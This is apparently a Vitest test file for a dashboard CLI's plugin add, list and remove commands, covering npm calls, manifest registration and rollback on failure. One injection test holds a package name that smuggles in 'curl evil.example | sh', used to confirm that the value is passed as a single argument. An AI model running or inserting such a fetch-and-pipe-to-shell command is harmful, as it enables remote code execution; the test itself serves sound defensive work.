import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

vi.mock("../../lib/config.js", () => ({
  assertCheckout: vi.fn(),
  findProjectRoot: vi.fn(() => "/project"),
}));

vi.mock("../../lib/exec.js", () => ({
  run: vi.fn(),
  runFile: vi.fn(),
}));

vi.mock("../../lib/output.js", () => ({
  success: vi.fn(),
  info: vi.fn(),
  error: vi.fn(),
  warn: vi.fn(),
  createSpinner: vi.fn(() => ({
    start: vi.fn(),
    succeed: vi.fn(),
    fail: vi.fn(),
  })),
}));

vi.mock("../../lib/manifest.js", () => ({
  readManifest: vi.fn(() => []),
  addToManifest: vi.fn(() => true),
  removeFromManifest: vi.fn(() => true),
}));

vi.mock("../../lib/plugin-validator.js", () => ({
  validatePluginExport: vi.fn(),
}));

import { findProjectRoot } from "../../lib/config.js";
import { run, runFile } from "../../lib/exec.js";
import { success, error as logError, warn, info } from "../../lib/output.js";
import {
  readManifest,
  addToManifest,
  removeFromManifest,
} from "../../lib/manifest.js";
import { validatePluginExport } from "../../lib/plugin-validator.js";
import {
  runPluginAdd,
  runPluginList,
  runPluginRemove,
} from "../../commands/plugin.js";

const mockRun = vi.mocked(run);
const mockRunFile = vi.mocked(runFile);
const mockSuccess = vi.mocked(success);
const mockError = vi.mocked(logError);
const mockWarn = vi.mocked(warn);
const mockInfo = vi.mocked(info);
const mockReadManifest = vi.mocked(readManifest);
const mockAddToManifest = vi.mocked(addToManifest);
const mockRemoveFromManifest = vi.mocked(removeFromManifest);
const mockValidate = vi.mocked(validatePluginExport);

const CHART_PKG = "@scope/chart-plugin-fake";
const CONN_PKG = "@scope/conn-plugin-fake";
const BROKEN_PKG = "@scope/broken-plugin-fake";
// Not npm's formatting, so only a byte-for-byte restore reproduces it.
const PKG_JSON = '{ "name": "root" }';
const LOCK = "lock-before";
let root: string;

// Fake `npm install`: records the dependency under the package's own name.
const npmInstalls = (name?: string) => (_file: string, args: string[]) => {
  if (args[0] === "install") {
    const pkg = JSON.parse(readFileSync(join(root, "package.json"), "utf8"));
    const spec = args.at(-1) as string;
    pkg.dependencies = { ...pkg.dependencies, [name ?? spec]: spec };
    writeFileSync(join(root, "package.json"), JSON.stringify(pkg, null, 2));
    writeFileSync(join(root, "package-lock.json"), "lock-after");
  }
  return "";
};

beforeEach(() => {
  vi.clearAllMocks();
  process.exitCode = 0;
  root = mkdtempSync(join(tmpdir(), "plugin-test-"));
  mkdirSync(join(root, "connection", "src"), { recursive: true });
  writeFileSync(join(root, "package.json"), PKG_JSON);
  writeFileSync(join(root, "package-lock.json"), LOCK);
  vi.mocked(findProjectRoot).mockReturnValue(root);
  mockRunFile.mockImplementation(npmInstalls());
  mockReadManifest.mockReturnValue([]);
  mockAddToManifest.mockReturnValue(true);
  mockRemoveFromManifest.mockReturnValue(true);

  // Reset module-level mocks for dynamic imports
  vi.doMock(CHART_PKG, () => ({
    default: {
      type: "fake-chart",
      label: "Fake Chart",
      transform: () => ({}),
    },
  }));
  vi.doMock(CONN_PKG, () => ({
    default: {
      type: "fake-conn",
      label: "Fake Connector",
      category: "database",
      createModule: () => ({}),
    },
  }));
});

afterEach(() => rmSync(root, { recursive: true, force: true }));

describe("runPluginAdd", () => {
  it("installs, validates, and registers a chart plugin", async () => {
    mockValidate.mockReturnValue({
      valid: true,
      errors: [],
      pluginType: "chart",
    });

    await runPluginAdd(CHART_PKG);

    // npm install (no-shell, arg array) + codegen invoked. --save beats a
    // user's `save=false`, so package.json names what npm installed.
    expect(mockRunFile).toHaveBeenCalledWith(
      "npm",
      ["install", "--save", CHART_PKG],
      { cwd: root },
    );
    expect(mockRun).toHaveBeenCalledWith(
      "node scripts/generate-plugin-imports.mjs",
      { cwd: root },
    );

    // Added under "plugins" key in neoboard-plugins.json
    expect(mockAddToManifest).toHaveBeenCalledTimes(1);
    const [path, key, entry] = mockAddToManifest.mock.calls[0];
    expect(path).toContain("neoboard-plugins.json");
    expect(key).toBe("plugins");
    expect(entry).toEqual({ package: CHART_PKG });

    expect(mockSuccess).toHaveBeenCalled();
    expect(process.exitCode).toBe(0);
  });

  it("passes a shell-metachar package name as a single argv element — no injection (#HIGH)", async () => {
    mockValidate.mockReturnValue({
      valid: true,
      errors: [],
      pluginType: "chart",
    });
    const EVIL = "evil-pkg; curl evil.example | sh";
    vi.doMock(EVIL, () => ({
      default: {
        type: "x",
        label: "x",
        transform: () => ({}),
      },
    }));

    await runPluginAdd(EVIL);

    // The whole string is ONE argv element — a shell never sees it, so the
    // `;` and `|` can't execute anything.
    expect(mockRunFile).toHaveBeenCalledWith(
      "npm",
      ["install", "--save", EVIL],
      { cwd: root },
    );
  });

  it("registers a connector plugin under connectors manifest + connector codegen", async () => {
    mockValidate.mockReturnValue({
      valid: true,
      errors: [],
      pluginType: "connector",
    });

    await runPluginAdd(CONN_PKG);

    expect(mockRun).toHaveBeenCalledWith(
      "node scripts/generate-connector-imports.mjs",
      { cwd: root },
    );
    const [path, key] = mockAddToManifest.mock.calls[0];
    expect(path).toContain("neoboard-connectors.json");
    expect(key).toBe("connectors");
  });

  it("includes `overrides: true` in the manifest entry when --override is set", async () => {
    mockValidate.mockReturnValue({
      valid: true,
      errors: [],
      pluginType: "chart",
    });

    await runPluginAdd(CHART_PKG, { override: true });

    const [, , entry] = mockAddToManifest.mock.calls[0];
    expect(entry).toEqual({ package: CHART_PKG, overrides: true });
  });

  it("records the export name in the manifest when --export <name> is used", async () => {
    // Use a unique package name to avoid vitest module-cache collision with the
    // default-export mock registered in beforeEach for CHART_PKG.
    const NAMED_PKG = "@scope/chart-plugin-fake-named-export";
    vi.doMock(NAMED_PKG, () => ({
      myExport: {
        type: "fake-chart",
        label: "Fake",
        transform: () => ({}),
      },
    }));
    mockValidate.mockReturnValue({
      valid: true,
      errors: [],
      pluginType: "chart",
    });

    await runPluginAdd(NAMED_PKG, { export: "myExport" });

    const [, , entry] = mockAddToManifest.mock.calls[0];
    expect(entry).toEqual({ package: NAMED_PKG, export: "myExport" });
  });

  it("warns and skips registration when the package is already in the manifest", async () => {
    mockValidate.mockReturnValue({
      valid: true,
      errors: [],
      pluginType: "chart",
    });
    mockAddToManifest.mockReturnValueOnce(false);

    await runPluginAdd(CHART_PKG);

    expect(mockWarn).toHaveBeenCalledWith(
      expect.stringContaining("already registered"),
    );
    // Still succeeds overall (idempotent re-add)
    expect(mockSuccess).toHaveBeenCalled();
  });

  it("rolls back (uninstalls) and exits 1 when npm install fails", async () => {
    mockRunFile.mockImplementationOnce(() => {
      throw new Error("npm install failed");
    });

    await runPluginAdd(BROKEN_PKG);

    expect(mockError).toHaveBeenCalled();
    expect(mockAddToManifest).not.toHaveBeenCalled();
    expect(process.exitCode).toBe(1);
  });

  it("rolls back when dynamic import throws (broken package)", async () => {
    // Auto-stubbed mock with no exports raises on .default access — simulates
    // a package that can't be imported (e.g., syntax error in entry, missing file).
    vi.doMock(BROKEN_PKG, () => ({}));

    await runPluginAdd(BROKEN_PKG);

    expect(mockError).toHaveBeenCalledWith(
      expect.stringContaining("Failed to import " + BROKEN_PKG),
    );
    expect(mockRunFile).toHaveBeenCalledWith(
      "npm",
      ["uninstall", BROKEN_PKG],
      expect.any(Object),
    );
    expect(mockAddToManifest).not.toHaveBeenCalled();
    expect(process.exitCode).toBe(1);
  });

  it("rolls back when the named --export is missing", async () => {
    vi.doMock(BROKEN_PKG, () => ({ default: { whatever: 1 } }));

    await runPluginAdd(BROKEN_PKG, { export: "missingExport" });

    expect(mockError).toHaveBeenCalledWith(
      expect.stringContaining('"missingExport"'),
    );
    expect(process.exitCode).toBe(1);
  });

  it("rolls back when the validator rejects the plugin and surfaces every error", async () => {
    mockValidate.mockReturnValue({
      valid: false,
      errors: ['"type" must be a non-empty string', "Not a valid plugin"],
    });

    await runPluginAdd(CHART_PKG);

    expect(mockError).toHaveBeenCalledWith(
      expect.stringContaining("not a valid NeoBoard plugin"),
    );
    // Each validator error printed as its own line
    expect(mockError).toHaveBeenCalledWith(
      expect.stringContaining('"type" must be a non-empty string'),
    );
    expect(mockError).toHaveBeenCalledWith(
      expect.stringContaining("Not a valid plugin"),
    );
    expect(mockAddToManifest).not.toHaveBeenCalled();
    expect(process.exitCode).toBe(1);
  });

  it.each(["x@1.2.0", "file:../x", "/abs/path/to/x"])(
    "imports and records the name npm installed for %s (#2065)",
    async (spec) => {
      mockRunFile.mockImplementation(npmInstalls("x"));
      vi.doMock("x", () => ({ default: { type: "x" } }));
      mockValidate.mockReturnValue({
        valid: true,
        errors: [],
        pluginType: "chart",
      });

      await runPluginAdd(spec);

      expect(mockAddToManifest.mock.calls[0]?.[2]).toEqual({ package: "x" });
    },
  );

  it("exits 1 without importing when package.json names no package for the spec (#2065)", async () => {
    mockRunFile.mockReturnValue(""); // npm left package.json as it was

    await runPluginAdd("x@1.2.0");

    expect(mockError).toHaveBeenCalledWith(
      expect.stringContaining("Could not tell which package"),
    );
    expect(mockAddToManifest).not.toHaveBeenCalled();
    expect(process.exitCode).toBe(1);
  });

  it.each([
    ["file:../x", "file:../x"],
    ["git+https://example.com/x.git", "git+https://example.com/x.git"],
    ["x@1.2.0", "^1.2.0"],
    ["@scope/x@1.2.0", "^1.2.0"],
    ["x", "^1.2.0"],
  ])(
    "re-adding %s, which npm leaves package.json unchanged for, registers the dependency it names (#2065)",
    async (spec, saved) => {
      const name = spec.startsWith("@scope/") ? "@scope/x" : "x";
      writeFileSync(
        join(root, "package.json"),
        JSON.stringify({ dependencies: { other: "^1.0.0", [name]: saved } }),
      );
      mockRunFile.mockReturnValue(""); // npm left package.json as it was
      vi.doMock(name, () => ({ default: { type: "x" } }));
      mockValidate.mockReturnValue({
        valid: true,
        errors: [],
        pluginType: "chart",
      });

      await runPluginAdd(spec);

      expect(mockAddToManifest.mock.calls[0]?.[2]).toEqual({ package: name });
      expect(process.exitCode).toBe(0);
    },
  );

  it.each([
    ["uninstalls a package it added", {}, 1],
    ["keeps a package the checkout already had", { x: "^1.0.0" }, 0],
  ])(
    "on a failed validation, %s and restores package.json and the lockfile byte for byte (#2065)",
    async (_, dependencies, uninstalls) => {
      const pkgJson = JSON.stringify({ name: "root", dependencies });
      writeFileSync(join(root, "package.json"), pkgJson);
      mockRunFile.mockImplementation(npmInstalls("x"));
      vi.doMock("x", () => ({ default: { type: "x" } }));
      mockValidate.mockReturnValue({ valid: false, errors: ["bad"] });

      await runPluginAdd("x@2.0.0");

      const uninstall = ["npm", ["uninstall", "x"], { cwd: root }];
      expect(
        mockRunFile.mock.calls.filter(([, args]) => args[0] !== "install"),
      ).toEqual(uninstalls ? [uninstall] : []);
      expect(readFileSync(join(root, "package.json"), "utf8")).toBe(pkgJson);
      expect(readFileSync(join(root, "package-lock.json"), "utf8")).toBe(LOCK);
      expect(process.exitCode).toBe(1);
    },
  );

  it("takes the manifest entry back out and exits 1 when codegen fails (#2065)", async () => {
    mockValidate.mockReturnValue({
      valid: true,
      errors: [],
      pluginType: "connector",
    });
    mockAddToManifest.mockImplementationOnce((path) => {
      writeFileSync(path, "{}");
      return true;
    });
    mockRun.mockImplementationOnce(() => {
      throw new Error("codegen broke");
    });

    await runPluginAdd(CONN_PKG);

    expect(existsSync(join(root, "neoboard-connectors.json"))).toBe(false);
    expect(mockSuccess).not.toHaveBeenCalled();
    expect(process.exitCode).toBe(1);
  });
});

describe("runPluginList", () => {
  it("lists exactly the chart types the app registers (#1687)", async () => {
    // The CLI cannot import app/ at runtime, so its built-in list is typed by
    // hand. Read the app's CHART_TYPES array here so re-adding a type the app
    // no longer registers fails this test instead of nothing.
    const registered = [
      ...readFileSync(
        fileURLToPath(
          new URL(
            "../../../../app/src/plugins/chart-types.ts",
            import.meta.url,
          ),
        ),
        "utf8",
      ).matchAll(/^\s+"([\w-]+)",$/gm),
    ].map((m) => m[1]);
    expect(registered.length).toBeGreaterThan(0); // the regex still matches

    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    try {
      await runPluginList();
      const builtIns = logSpy.mock.calls
        .map((c) => c[0] as string)
        .filter((line) => line.endsWith("built-in"))
        .map((line) => line.trim().split(/\s+/)[0]);
      expect(builtIns).toEqual(registered);
      expect(mockInfo).toHaveBeenCalledWith(
        expect.stringMatching(
          new RegExp(
            `Charts \\(${registered.length} built-in, \\d+ external\\)`,
          ),
        ),
      );
    } finally {
      logSpy.mockRestore();
    }
  });

  it("lists the connection package's built-in connectors and each external plugin's type (#2065)", async () => {
    const dir = join(root, "connection", "src", "fakekv");
    mkdirSync(dir);
    writeFileSync(
      join(dir, "descriptor.ts"),
      'export const d = {\n  type: "fakekv",\n  fields: [{\n    type: "uri",\n  }],\n};\n',
    );
    // As in the real package: a file beside the connector folders is not one.
    writeFileSync(join(root, "connection", "src", "index.ts"), "");
    mockReadManifest.mockImplementation((path) =>
      path.includes("neoboard-plugins.json")
        ? [{ package: "ext-chart-pkg" }]
        : [{ package: "ext-conn-pkg", overrides: true }],
    );
    vi.doMock("ext-conn-pkg", () => ({ default: { type: "extkv" } }));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    try {
      await runPluginList();

      expect(mockInfo).toHaveBeenCalledWith(
        "Connectors (1 built-in, 1 external):",
      );
      const logs = logSpy.mock.calls.map((c) => c[0] as string).join("\n");
      expect(logs).toMatch(/fakekv\s+built-in/);
      expect(logs).toMatch(/extkv\s+external {2}ext-conn-pkg {2}\(overrides\)/);
      // A package that cannot be imported still lists, by package name.
      expect(logs).toMatch(/\?\s+external {2}ext-chart-pkg/);
    } finally {
      logSpy.mockRestore();
    }
  });
});

describe("runPluginRemove", () => {
  it("removes a chart plugin and runs chart codegen + npm uninstall", async () => {
    // First call (plugins manifest) removes successfully
    mockRemoveFromManifest.mockReturnValueOnce(true);

    runPluginRemove(CHART_PKG);

    const [path, key, name] = mockRemoveFromManifest.mock.calls[0];
    expect(path).toContain("neoboard-plugins.json");
    expect(key).toBe("plugins");
    expect(name).toBe(CHART_PKG);

    expect(mockRun).toHaveBeenCalledWith(
      "node scripts/generate-plugin-imports.mjs",
      { cwd: root },
    );
    expect(mockRunFile).toHaveBeenCalledWith("npm", ["uninstall", CHART_PKG], {
      cwd: root,
    });
    expect(mockSuccess).toHaveBeenCalled();
    expect(process.exitCode).toBe(0);
  });

  it("falls back to connectors manifest when not in plugins manifest", async () => {
    mockRemoveFromManifest
      .mockReturnValueOnce(false) // plugins: miss
      .mockReturnValueOnce(true); // connectors: hit

    runPluginRemove(CONN_PKG);

    expect(mockRemoveFromManifest).toHaveBeenCalledTimes(2);
    expect(mockRun).toHaveBeenCalledWith(
      "node scripts/generate-connector-imports.mjs",
      { cwd: root },
    );
    expect(mockSuccess).toHaveBeenCalled();
  });

  it("errors and exits 1 when the package is not in either manifest", async () => {
    mockRemoveFromManifest.mockReturnValue(false);

    runPluginRemove("never-installed");

    expect(mockError).toHaveBeenCalledWith(
      expect.stringContaining("not registered as an external plugin"),
    );
    expect(mockRun).not.toHaveBeenCalled();
    expect(process.exitCode).toBe(1);
  });

  it("warns but still succeeds when npm uninstall fails after manifest removal", async () => {
    mockRemoveFromManifest.mockReturnValueOnce(true);
    // codegen (run) OK; npm uninstall (runFile) throws
    mockRun.mockReturnValue("");
    mockRunFile.mockImplementationOnce(() => {
      throw new Error("npm uninstall failed");
    });

    runPluginRemove(CHART_PKG);

    expect(mockWarn).toHaveBeenCalledWith(
      expect.stringContaining("npm uninstall failed"),
    );
    expect(mockSuccess).toHaveBeenCalled();
  });
});
